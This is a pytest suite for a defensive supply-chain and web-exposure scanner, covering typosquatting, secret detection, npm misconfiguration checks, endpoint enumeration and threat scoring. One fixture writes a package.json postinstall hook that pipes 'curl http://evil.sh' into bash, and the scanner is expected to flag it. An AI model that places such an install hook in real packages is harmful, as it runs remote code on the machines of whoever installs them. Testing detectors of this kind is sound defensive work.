"""Tests for the deep-scan pillar: vulnerability scanner, endpoint enumerator, threat patterns.

No test performs a real HTTP call: every network path goes through a patched safe_fetch.
"""

import json
from types import SimpleNamespace
from unittest.mock import MagicMock, patch
from urllib.parse import urlparse

import pytest

from app.scanner import endpoint_enumerator as ee
from app.scanner import threat_patterns as tp
from app.scanner import vulnerability_scanner as vs
from app.schema import StackItem, Target

RUN = "r_test"


@pytest.fixture
def emit():
    return MagicMock()


def mk_item(package, version=None, name=None, direct=True, sid=None):
    return StackItem(
        id=sid or f"id_{package}_{version}", run_id=RUN, target_id="t_x",
        ecosystem="npm", package=package, name=name or package, version=version, direct=direct,
    )


def mk_target(domain=None, deploy_url=None, repo=None, kind="public", tid="t_x"):
    return Target(target_id=tid, kind=kind, name="n", domain=domain,
                  deploy_url=deploy_url, repo=repo)


# --------------------------------------------------------------------------- #
# vulnerability_scanner: helpers
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("a,b,expected", [
    ("react", "react", 0), ("react", "reactt", 1), ("lodash", "lodahs", 2),
    ("express", "expres", 1),
])
def test_levenshtein(a, b, expected):
    assert vs._levenshtein(a, b, cap=3) == expected


def test_levenshtein_exceeds_cap_returns_cap_plus_one():
    assert vs._levenshtein("react", "angular", cap=2) == 3
    assert vs._levenshtein("x", "xxxxxxxx", cap=2) > 2


@pytest.mark.parametrize("s,low", [("aaaaaa", True), ("A1b2C3d4E5f6G7h8", False)])
def test_shannon_entropy(s, low):
    ent = vs._shannon_entropy(s)
    assert (ent < 2.0) is low


@pytest.mark.parametrize("secret,expected_mask", [
    ("AKIAIOSFODNN7EXAMPLE", "AKIA" + "*" * 14 + "LE"),
    ("short", "s****"),
    ("", ""),
])
def test_redact(secret, expected_mask):
    assert vs._redact(secret) == expected_mask


# --------------------------------------------------------------------------- #
# vulnerability_scanner: scan_dependencies
# --------------------------------------------------------------------------- #

def test_typosquatting_flagged(emit):
    findings = vs.scan_dependencies([mk_item("expres")], RUN, emit)
    assert any(f["type"] == "typosquatting" and f["package"] == "expres" for f in findings)


def test_exact_popular_package_not_flagged(emit):
    findings = vs.scan_dependencies([mk_item("react", "18.0.0")], RUN, emit)
    assert not any(f["type"] == "typosquatting" for f in findings)


def test_single_char_name_flagged(emit):
    findings = vs.scan_dependencies([mk_item("x")], RUN, emit)
    assert any(f["type"] == "suspicious_package_name" for f in findings)


def test_dependency_confusion_heuristic(emit):
    findings = vs.scan_dependencies([mk_item("acme-internal-utils")], RUN, emit)
    assert any(f["type"] == "dependency_confusion_candidate" for f in findings)


def test_scoped_package_uses_bare_name(emit):
    # @angular/core should not be mistaken for a typosquat of a popular bare name
    findings = vs.scan_dependencies([mk_item("@angular/core", "15.0.0")], RUN, emit)
    assert not any(f["type"] == "typosquatting" for f in findings)


def test_scan_dependencies_dedupes(emit):
    items = [mk_item("expres"), mk_item("expres")]
    findings = vs.scan_dependencies(items, RUN, emit)
    assert len([f for f in findings if f["type"] == "typosquatting"]) == 1


def test_empty_stack_items(emit):
    assert vs.scan_dependencies([], RUN, emit) == []


class FakeRegistry:
    def __init__(self, meta=None, raises=False):
        self.meta = meta or {}
        self.raises = raises

    def fetch_metadata(self, package):
        if self.raises:
            raise RuntimeError("registry down")
        return self.meta.get(package)


def test_registry_dependency_confusion(emit):
    reg = FakeRegistry({"acme-lib": {"internal": True, "public_hit": True}})
    findings = vs.scan_dependencies([mk_item("acme-lib")], RUN, emit, registry=reg)
    assert any(f["type"] == "dependency_confusion" and f["severity"] == "critical" for f in findings)


def test_registry_version_gap(emit):
    reg = FakeRegistry({"gap-pkg": {"versions_time": {"1.0.0": "x"}, "unpublished_versions": ["0.9.0"]}})
    findings = vs.scan_dependencies([mk_item("gap-pkg")], RUN, emit, registry=reg)
    assert any(f["type"] == "version_gap" for f in findings)


def test_registry_maintainer_takeover(emit):
    reg = FakeRegistry({"old-pkg": {"created_ts": "2014-01-01", "new_publisher": True}})
    findings = vs.scan_dependencies([mk_item("old-pkg")], RUN, emit, registry=reg)
    assert any(f["type"] == "maintainer_takeover" for f in findings)


def test_registry_exception_is_isolated(emit):
    reg = FakeRegistry(raises=True)
    # Must not raise; typosquat check still runs.
    findings = vs.scan_dependencies([mk_item("expres")], RUN, emit, registry=reg)
    assert any(f["type"] == "typosquatting" for f in findings)


# --------------------------------------------------------------------------- #
# vulnerability_scanner: scan_secrets_exposure
# --------------------------------------------------------------------------- #

def test_detects_aws_key(tmp_path, emit):
    (tmp_path / "cfg.txt").write_text("key = AKIAIOSFODNN7EXAMPLE\n")
    findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert any(f["type"] == "secret_exposure" and "aws" in f["detail"].lower() for f in findings)
    assert all("AKIAIOSFODNN7EXAMPLE" not in f["detail"] for f in findings)  # redacted


def test_detects_github_token(tmp_path, emit):
    (tmp_path / "a.js").write_text("const t = 'ghp_" + "a" * 36 + "'\n")
    findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert any(f["type"] == "secret_exposure" for f in findings)


def test_detects_private_key(tmp_path, emit):
    (tmp_path / "id_rsa").write_text("-----BEGIN RSA PRIVATE KEY-----\nabc\n")
    findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert any("private key" in f["title"].lower() for f in findings)


def test_detects_connection_string(tmp_path, emit):
    (tmp_path / "db.env").write_text("DB=postgres://user:secretpw@host:5432/db\n")
    findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert any(f["type"] == "secret_exposure" for f in findings)


def test_generic_high_entropy_flagged(tmp_path, emit):
    (tmp_path / "s.txt").write_text("api_key = 'aB3xZ9qL2mN8pQ7rT4vW1yU6'\n")
    findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert any(f["type"] == "secret_exposure" for f in findings)


def test_low_entropy_not_flagged_as_generic(tmp_path, emit):
    (tmp_path / "s.txt").write_text("password = 'aaaaaaaaaaaaaaaaaaaaaa'\n")
    findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert not findings


def test_skips_node_modules_and_git(tmp_path, emit):
    for d in ("node_modules", ".git"):
        sub = tmp_path / d
        sub.mkdir()
        (sub / "leak.txt").write_text("AKIAIOSFODNN7EXAMPLE\n")
    assert vs.scan_secrets_exposure(tmp_path, emit) == []


def test_skips_binary_files(tmp_path, emit):
    (tmp_path / "blob.bin").write_bytes(b"AKIAIOSFODNN7EXAMPLE\x00\x01\x02")
    assert vs.scan_secrets_exposure(tmp_path, emit) == []


def test_skips_large_files(tmp_path, emit):
    big = tmp_path / "big.txt"
    big.write_text("x" * (vs.MAX_FILE_BYTES + 10) + "\nAKIAIOSFODNN7EXAMPLE\n")
    assert vs.scan_secrets_exposure(tmp_path, emit) == []


def test_symlink_is_not_followed(tmp_path, emit):
    secret = tmp_path / "outside.txt"
    secret.write_text("AKIAIOSFODNN7EXAMPLE\n")
    link_dir = tmp_path / "repo"
    link_dir.mkdir()
    (link_dir / "ln.txt").symlink_to(secret)
    findings = vs.scan_secrets_exposure(link_dir, emit)
    assert findings == []


def test_secret_scan_nonexistent_dir(tmp_path, emit):
    assert vs.scan_secrets_exposure(tmp_path / "ghost", emit) == []


def test_one_bad_file_does_not_kill_scan(tmp_path, emit):
    (tmp_path / "good.txt").write_text("AKIAIOSFODNN7EXAMPLE\n")
    walk = [(str(tmp_path), [], ["gone.txt", "good.txt"])]
    real_open = open

    def flaky_open(path, *a, **k):
        if str(path).endswith("gone.txt"):
            raise OSError("vanished")
        return real_open(path, *a, **k)

    with patch.object(vs.os, "walk", return_value=walk), \
         patch.object(vs, "_looks_binary", return_value=False), \
         patch("builtins.open", side_effect=flaky_open):
        findings = vs.scan_secrets_exposure(tmp_path, emit)
    assert any(f["type"] == "secret_exposure" for f in findings)


# --------------------------------------------------------------------------- #
# vulnerability_scanner: scan_misconfigurations
# --------------------------------------------------------------------------- #

def test_dangerous_postinstall(tmp_path, emit):
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "x", "files": ["dist"],
        "scripts": {"postinstall": "curl http://evil.sh | bash"}}))
    findings = vs.scan_misconfigurations(tmp_path, emit)
    assert any(f["type"] == "dangerous_install_script" for f in findings)


def test_missing_files_field(tmp_path, emit):
    (tmp_path / "package.json").write_text(json.dumps({"name": "x"}))
    findings = vs.scan_misconfigurations(tmp_path, emit)
    assert any(f["type"] == "missing_files_field" for f in findings)


def test_private_package_not_flagged_for_files(tmp_path, emit):
    (tmp_path / "package.json").write_text(json.dumps({"name": "x", "private": True}))
    findings = vs.scan_misconfigurations(tmp_path, emit)
    assert not any(f["type"] == "missing_files_field" for f in findings)


def test_npmrc_auth_token(tmp_path, emit):
    (tmp_path / ".npmrc").write_text("//registry.npmjs.org/:_authToken=abc123secrettoken\n")
    findings = vs.scan_misconfigurations(tmp_path, emit)
    assert any(f["type"] == "npmrc_auth_token" and f["severity"] == "critical" for f in findings)


def test_forced_install_config(tmp_path, emit):
    (tmp_path / ".npmrc").write_text("legacy-peer-deps=true\n")
    findings = vs.scan_misconfigurations(tmp_path, emit)
    assert any(f["type"] == "forced_install_config" for f in findings)


def test_misconfig_invalid_json_tolerated(tmp_path, emit):
    (tmp_path / "package.json").write_text("{not valid json")
    assert vs.scan_misconfigurations(tmp_path, emit) == []


def test_misconfig_no_package_json(tmp_path, emit):
    assert vs.scan_misconfigurations(tmp_path, emit) == []


# --------------------------------------------------------------------------- #
# endpoint_enumerator
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("target,expected", [
    (mk_target(domain="example.com"), "https://example.com"),
    (mk_target(deploy_url="http://app.example.com:8080/x"), "http://app.example.com:8080"),
    (mk_target(), None),
])
def test_base_url(target, expected):
    assert ee._base_url(target) == expected


@pytest.mark.parametrize("path,kind", [
    ("/api/users", "api"), ("/graphql", "api"), ("/admin", "admin"),
    ("/dashboard/x", "admin"), ("/.env", "sensitive"), ("/swagger.json", "sensitive"),
    ("/about", "page"),
])
def test_classify_kind(path, kind):
    assert ee._classify_kind(path) == kind


def test_enumerate_no_base_returns_empty(emit):
    assert ee.enumerate_endpoints(mk_target(), RUN, emit) == []


def test_robots_paths_extracted(emit):
    def fetch(url, tid, _e):
        if url.endswith("robots.txt"):
            return "User-agent: *\nDisallow: /secret-admin/\nAllow: /public\n", {}
        return None, {}
    with patch.object(ee, "safe_fetch", side_effect=fetch):
        eps = ee.enumerate_endpoints(mk_target(domain="example.com"), RUN, emit)
    paths = {e["path"] for e in eps}
    assert "/secret-admin/" in paths


def test_sitemap_recursion_and_cap(emit):
    index = "<sitemapindex><loc>https://example.com/sm1.xml</loc></sitemapindex>"
    child = "".join(f"<url><loc>https://example.com/p{i}</loc></url>" for i in range(250))

    def fetch(url, tid, _e):
        if url.endswith("sitemap.xml"):
            return index, {}
        if url.endswith("sm1.xml"):
            return child, {}
        return None, {}
    with patch.object(ee, "safe_fetch", side_effect=fetch):
        eps = ee.enumerate_endpoints(mk_target(domain="example.com"), RUN, emit)
    sm = [e for e in eps if e["source"] == "sitemap.xml"]
    assert len(sm) <= ee.MAX_SITEMAP_URLS


def test_sitemap_depth_limited(emit):
    # Each sitemap points to another nested sitemap; depth must stop the recursion.
    calls = []

    def fetch(url, tid, _e):
        calls.append(url)
        if url.endswith(".xml"):
            n = len(calls)
            return f"<loc>https://example.com/s{n}.xml</loc>", {}
        return None, {}
    with patch.object(ee, "safe_fetch", side_effect=fetch):
        ee.enumerate_endpoints(mk_target(domain="example.com"), RUN, emit)
    xml_calls = [c for c in calls if c.endswith(".xml")]
    assert len(xml_calls) <= ee.MAX_SITEMAP_DEPTH + 2


def test_page_links_same_host_only(emit):
    html = ('<a href="/api/orders">o</a><script src="https://cdn.other.com/x.js"></script>'
            '<form action="/login"></form>')

    def fetch(url, tid, _e):
        return (html, {}) if url.rstrip("/").endswith("example.com") or url.endswith("/") else (None, {})
    with patch.object(ee, "safe_fetch", side_effect=fetch):
        eps = ee.enumerate_endpoints(mk_target(domain="example.com"), RUN, emit)
    hosts = {urlparse(e["url"]).hostname for e in eps}
    assert "cdn.other.com" not in hosts
    assert "/api/orders" in {e["path"] for e in eps}


def test_known_sensitive_paths_probed(emit):
    with patch.object(ee, "safe_fetch", return_value=(None, {})):
        eps = ee.enumerate_endpoints(mk_target(domain="example.com"), RUN, emit)
    paths = {e["path"] for e in eps}
    assert "/.env" in paths and "/.git/config" in paths


def test_fingerprint_public_200(emit):
    eps = [{"url": "https://example.com/api/x", "path": "/api/x", "source": "page",
            "kind": "api", "status_code": None, "auth_required": None,
            "tech_signals": {}, "risk_level": "medium"}]
    with patch.object(ee, "safe_fetch", return_value=("body", {"Server": "nginx"})):
        out = ee.fingerprint_endpoints(eps, mk_target(domain="example.com"), emit)
    assert out[0]["status_code"] == 200
    assert out[0]["classification"] == "public"
    assert out[0]["tech_signals"] == {"server": "nginx"}
    assert out[0]["risk_level"] == "high"  # public no-auth api


def test_fingerprint_authenticated(emit):
    eps = [_blank_ep("/admin", "admin")]
    with patch.object(ee, "safe_fetch", return_value=(None, {"www-authenticate": "Basic"})):
        out = ee.fingerprint_endpoints(eps, mk_target(domain="example.com"), emit)
    assert out[0]["classification"] == "authenticated" and out[0]["auth_required"] is True


def test_fingerprint_redirect(emit):
    eps = [_blank_ep("/old", "page")]
    with patch.object(ee, "safe_fetch", return_value=(None, {"location": "/new"})):
        out = ee.fingerprint_endpoints(eps, mk_target(domain="example.com"), emit)
    assert out[0]["classification"] == "redirect"


def test_fingerprint_sensitive_public_is_critical(emit):
    eps = [_blank_ep("/.env", "sensitive")]
    with patch.object(ee, "safe_fetch", return_value=("SECRET=1", {})):
        out = ee.fingerprint_endpoints(eps, mk_target(domain="example.com"), emit)
    assert out[0]["risk_level"] == "critical"


def test_fingerprint_exception_isolated(emit):
    eps = [_blank_ep("/a", "page"), _blank_ep("/b", "page")]
    with patch.object(ee, "safe_fetch", side_effect=[RuntimeError("boom"), ("ok", {})]):
        out = ee.fingerprint_endpoints(eps, mk_target(domain="example.com"), emit)
    assert len(out) == 2 and out[1]["status_code"] == 200


def _blank_ep(path, kind):
    return {"url": f"https://example.com{path}", "path": path, "source": "known-path",
            "kind": kind, "status_code": None, "auth_required": None,
            "tech_signals": {}, "risk_level": "low"}


# --------------------------------------------------------------------------- #
# threat_patterns
# --------------------------------------------------------------------------- #

def _cand(advisory_id, severity="high", stack_item_id="s1"):
    return {"advisory_id": advisory_id, "severity_hint": severity, "stack_item_id": stack_item_id}


def _ep(path, kind, classification="public", auth_required=False, risk="high"):
    return {"path": path, "kind": kind, "classification": classification,
            "auth_required": auth_required, "risk_level": risk, "url": "https://x" + path}


def test_no_threats_without_signals(emit):
    assert tp.surface_threats([], [], [], [], emit) == []


def test_supply_chain_pattern(emit):
    vuln = [{"id": "v1", "type": "typosquatting", "package": "expres", "severity": "high"}]
    threats = tp.surface_threats([], [], [], vuln, emit)
    assert any(t["name"] == "Supply chain attack" for t in threats)
    t = threats[0]
    assert "T1195" in t["mitre_techniques"] and 0 <= t["score"] <= 10


def test_credential_exposure_chain(emit):
    vuln = [{"id": "v1", "type": "secret_exposure", "severity": "critical"}]
    eps = [_ep("/api/data", "api", auth_required=False)]
    threats = tp.surface_threats([], [], eps, vuln, emit)
    assert any(t["name"] == "Credential exposure chain" for t in threats)


def test_lateral_movement_surface(emit):
    eps = [_ep("/admin", "admin")]
    cands = [_cand("GHSA-auth", "critical")]
    threats = tp.surface_threats(cands, [], eps, [], emit)
    assert any(t["name"] == "Lateral movement surface" for t in threats)


def test_data_exfiltration_risk_resolves_package_via_stack(emit):
    items = [mk_item("mongoose", "5.0.0", sid="s1")]
    cands = [_cand("GHSA-mongo", "high", stack_item_id="s1")]
    eps = [_ep("/api/users", "api", auth_required=False)]
    threats = tp.surface_threats(cands, items, eps, [], emit)
    assert any(t["name"] == "Data exfiltration risk" for t in threats)


def test_outdated_dependency_chain(emit):
    items = [mk_item(f"p{i}", "0.1.0", sid=f"s{i}") for i in range(6)]
    cands = [_cand("GHSA-x", "high")]
    threats = tp.surface_threats(cands, items, [], [], emit)
    assert any(t["name"] == "Outdated dependency chain" for t in threats)


def test_threats_sorted_by_score(emit):
    vuln = [{"id": "v1", "type": "secret_exposure", "severity": "critical"},
            {"id": "v2", "type": "typosquatting", "package": "expres", "severity": "high"}]
    eps = [_ep("/api/data", "api", auth_required=False), _ep("/admin", "admin")]
    cands = [_cand("GHSA-1", "critical")]
    threats = tp.surface_threats(cands, [], eps, vuln, emit)
    scores = [t["score"] for t in threats]
    assert scores == sorted(scores, reverse=True)


def test_get_accepts_objects_and_dicts():
    assert tp._get({"a": 1}, "a") == 1
    assert tp._get(SimpleNamespace(a=2), "a") == 2
    assert tp._get({"x": 1}, "missing", "d") == "d"


@pytest.mark.parametrize("severity,expect_higher", [("critical", True), ("low", False)])
def test_score_monotonic_with_severity(severity, expect_higher):
    pattern = {"components": ["a", "b", "c"]}
    ctx = {"g": [{"severity": severity}]}
    score = tp.score_threat(pattern, ctx)
    assert (score >= 7.0) is expect_higher


def test_score_threat_bounded():
    pattern = {"components": ["a"] * 20}
    ctx = {"g": [{"severity": "critical"}] * 20}
    assert 0.0 <= tp.score_threat(pattern, ctx) <= 10.0


def test_narrative_has_numbered_steps(emit):
    vuln = [{"id": "v1", "type": "dependency_confusion", "package": "acme", "severity": "critical"}]
    threats = tp.surface_threats([], [], [], vuln, emit)
    narrative = threats[0]["narrative"]
    assert "(1)" in narrative and "(4)" in narrative


def test_remediation_priority_set(emit):
    vuln = [{"id": "v1", "type": "secret_exposure", "severity": "critical"}]
    eps = [_ep("/api/data", "api", auth_required=False)]
    threats = tp.surface_threats([], [], eps, vuln, emit)
    assert threats[0]["remediation_priority"] in ("immediate", "high", "medium")
